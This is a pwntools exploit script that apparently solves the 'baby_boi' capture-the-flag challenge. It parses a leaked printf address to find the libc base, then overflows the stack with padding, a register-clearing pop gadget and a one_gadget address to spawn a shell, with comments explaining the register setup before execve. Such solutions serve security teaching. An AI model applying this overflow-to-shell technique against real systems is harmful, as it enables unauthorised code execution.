from pwn import *

# Load Context, binary, libc
context.terminal = ['tmux','splitw' ,'-h']
context.binary = "./baby_boi"
binary = ELF("./baby_boi")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

#p = process("./baby_boi")
p = gdb.debug("./baby_boi", '''
break main
break *0x400723
''')

p.recvuntil("am: ")
leak = p.recvline()
leak = leak.strip('\n')

print 'leak: ', leak

libc_base = int(leak, 16) - libc.symbols['printf']

print "libc base: ", hex(libc_base)

one_gadget = libc_base + 0xcbcba
pop_r = 0x40078c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
system = libc_base + libc.symbols['system']

payload = ''
payload += 'A' * 40
payload += p64(pop_r)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(one_gadget)

p.sendline(payload)
p.interactive()

#   Notes - Used gadget 'pop_r' because registers 'r12' 'r13' 'r14' 'r15' weren't clean.
#   Instructions shown below show what happens before execve is called.

#   0x7ff9d8c23cba <maybe_script_execute+154>    mov    rdx, r13 <- r13 is 0: CLEAN
#   0x7ff9d8c23cbd <maybe_script_execute+157>    mov    rsi, r12 <---------- NOT CLEAN
#   0x7ff9d8c23cc0 <maybe_script_execute+160>    lea    rdi, [rip + 0xbe48f] <- '/bin/sh'
#   0x7ff9d8c23cc7 <maybe_script_execute+167>    call   execve <execve>

#   NOT CLEAN: 'r12' -> rsi. Since whatever is in r12 goes into 'rsi', we then need
#   to 0 out r12 so that we get a clean syscall.

#   execv(rdi, rsi, rdx)
#   execv('/bin/sh', 0, 0)


